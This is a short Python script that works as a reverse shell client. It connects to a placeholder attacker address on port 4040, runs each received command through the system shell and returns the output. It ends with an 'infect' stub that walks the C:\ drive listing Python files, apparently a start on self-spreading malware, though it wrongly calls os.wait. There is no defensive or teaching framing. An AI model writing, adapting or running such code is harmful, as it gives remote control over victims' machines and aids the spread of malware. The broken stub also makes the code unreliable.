import subprocess
from socket import *
import os

if __name__ == "__main__":
    s = socket()
    s.settimeout(9999)
    s.connect(('<ip>',4040))
    while True:
        cmd = str(s.recv(1000),encoding='utf8')
        if(cmd=='exit'):
            s.send(bytes("rec", encoding='utf8'))
            break
        else:
            cmd = cmd[cmd.index(':')+1:]
            s.send(bytes("rec", encoding='utf8'))
            try:
                out = subprocess.check_output(cmd,stderr=subprocess.STDOUT,timeout=5,shell=True)
                if out != b'':
                    s.send(out)
                else:
                    s.send(bytes('no output from command',encoding='utf8'))
            except subprocess.CalledProcessError:
                s.send(bytes("error", encoding='utf8'))

    s.close()

def infect():
    for root,dirs,files in os.wait('C:\\'):
        for file in files:
            if file.endswith('.py') or file.endswith('.pyw'):
                print(file)